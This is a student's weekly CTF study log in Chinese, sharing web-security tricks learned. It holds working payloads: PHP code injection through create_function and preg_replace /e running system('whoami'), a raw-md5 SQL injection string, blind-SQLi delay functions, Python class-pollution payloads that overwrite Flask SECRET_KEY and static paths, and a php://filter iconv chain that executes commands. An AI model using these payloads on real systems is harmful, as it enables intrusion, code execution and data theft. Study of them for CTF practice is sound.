# 完成事项

+ ## web方面

  1. 做了ISCTF的wp
  2. 学习到了许多曾经不知晓的版本特性和函数

+ ## 工具方面

  利用obsidian初步搭建了我关于web安全的笔记知识库

---

# 下周待做事项

学习python相关知识

---

# 本周学习的知识分享

+ **Error 类绕过 (`__toString`)**

  原理：利用 PHP 原生类 Error 的 __toString 方法。如果两个 Error 对象行号、消息一致，md5($obj) 结果相同。

  Payload 生成代码:

  ```php
  $str = "test"; 
  $a = new Error($str, 1); $b = new Error($str, 2); // 必须在一行
  echo urlencode(serialize($a));
  echo "&";
  echo urlencode(serialize($b));
  ```

+ **sql注入+哈希绕过**

  原理：md5($str, true) 返回原始二进制。若二进制包含 'or'，可构成 SQL 注入。

  Payload: ffifdyop

  + **Hex**: `276f7227...` -> `'or'1...`

+ **create_function()**

  PHP 7.2 弃用，PHP 8.0 移除。 **原理**：利用 `}` 闭合函数体，注入恶意代码。

  ```php
  <?php 
      $func = create_function('', $_POST['code']); 
      $func(); 
  ?>
  // Payload (POST): code=};system('whoami');//
  // 运行结果: www-data
  // 解析: 源码变为 function(){ };system('whoami');// }
  ```

+  **preg_replace() (/e 模式)**

  PHP 7.0 移除 `/e` 支持。 **原理**：`/e` 修饰符会让替换后的字符串当做代码执行。

  ```php
  //preg_replace('正则规则','替换字符'，'目标字符')
  <?php
      preg_replace("/test/e", $_POST["cmd"], "just test case");
  ?>
  // Payload (POST): cmd=system('whoami')
  // 运行结果: www-data
  ```

+  **盲注与延时函数判断**

  在无回显的情况下，利用时间延迟函数判断。

  1. MySQL

  ```sql
  -- 密集运算延时
  BENCHMARK(1000000,ENCODE('QWE','ASD'))
  -- 固定延时 (v5.0.12+)
  SLEEP(5)
  ```

  2. PostgreSQL

  ```sql
  PG_SLEEP(5)
  GENERATE_SERIES(1,1000000)
  ```

  3. SQL Server

  ```sql
  WAITFOR DELAY '0:0:5'
  ```

  4. SQLite

  SQLite 没有直接的 sleep 函数，通常利用密集随机数计算制造延时。

  ```sql
  1' or (case when(substr(sqlite_version(),1,1)='3') then randomblob(1000000000) else 0 end)--
  ```

+ **zip软链接**

  ```plain
  ln -s /flag link	//生成一个软链接指向/flag
  zip --symlinks flag.zip link        //把这个软链接压缩在flag.zip里
  ```

  这里会生成一个flag.zip，假如他被解压到了/tmp目录下，我们在tmp目录下就能找到根目录的flag文件。

+ **php字符串拼接方法**

  1、点拼接

  ```php
  echo "/fl"."ag";
  ```

  2、直接拼接

  ```php
  <?php
  $a = "/fl";
  $b = "ag";
  echo $a,$b;
  ```

  3、join/implode函数拼接

  把数组元素组合为一个字符串：

  ```php
  <?php
  $arr = array("/fl","ag");
  echo join(" ",$arr);
  //输出/flag
  ```

  利用该函数可以随机读根目录文件：

  ```php
  readfile(join(array("/",array_rand(array_flip(scandir("/"))))));
  ```

+ **str_replace() 和preg_replace ()**

  把字符串 "Hello world!" 中的字符 "world" 替换为 "Shanghai"：

  ```php
  echo str_replace("world","Shanghai","Hello world!"); //Hello Shanghai! 
  preg_replace (正则表达式, 替换成什么东西, 目标字符串,)    //可用正则多行绕过。
  ```

  二者均可用**双写绕过**。
  
+ **js游戏题**

  1、首先看看js代码美化之后能不能直接出flag，不能就在控制台执行一下flag所在的函数，可以直接出flag。

  2、找到分数变量后，也可以直接在控制台中设置高分数，如输入：score = 1000就可以直接满足题目目标。

  3、若代码特别冗长，可以尝试js里搜索flag、php、score、time等关键字。

  4、不要总想着改时间，改金钱，改分数等等，可以变向地做题，比如改地图大小，改速度等等。

  5、找到被加密的flag代码后，要把加密函数全部复制进控制台，确认后，再把输出函数放进控制台才能输出flag。
  
+ **python原型链污染**

  污染只对类的属性起作用，对于类方法是无效的。

  ```python
  {
      "__class__" : {
          "__base__" : {
              "aaa" : "bbb"
          }
      }
  }
  ```

  sys模块加载获取：

  在许多的环境中导入模块并不是简单的利用import进行导入同级目录下的文件，更多的是利用第三方模块和内置模块进行导入。这时候我们就无法简单的利用上面的payload进行重定向了，我们需要使用sys这个模块进行定向。
  sys模块中有一个modules属性，这个属性包含了这个程序运行时导入的所有模块。比如这个题app.py里使用了os模块，那么这个模块就会存在于sys里。

  ```python
  {{g.pop.__globals__.sys.modules.os.system}}
  ```

  所以我们可以通过他来进行重定向。

  ```python
  {"__init__":{"__globals__":{"sys":{"modules":{"DEMO":{"a":2}}}}}}
  ```

  修改jinja变量标识符，这里别人的标识符是什么就修改成什么

  ```python
  {"__init__" : {"__globals__" : {"app" : {"jinja_env" :{"variable_start_string":"[#","variable_end_string":"#]"}}}}}
  ```
  
  污染key：

  ```python
  {"__init__":{"__globals__":{"app":{"config":{"SECRET_KEY":"123456"}}}}}
  ```
  
  污染static目录

  ```python
  {"__init__":{"__globals__":{"app":{"_static_folder":"/"}}}}
  ```
  
+ **$_REQUEST**

  超级全局变量是在所有作用域中始终可用的内置变量。默认情况下包含了 \_GET，_POST和  $_COOKIE的数组。

  如果POST和GET传相同名字的参数结果会是：因为POST的优先级比GET高，如果参数名相同，最终$_REQUEST中的值应该是POST里那个参数的
  
+ **通用文件包含**

  ```txt
  php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16|convert.iconv.WINDOWS-1258.UTF32LE|convert.iconv.ISIRI3342.ISO-IR-157|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp&0=ls
  ```

---

# 本周学习总结

放假有稍许懈怠，需花更多时间把先前的补回来
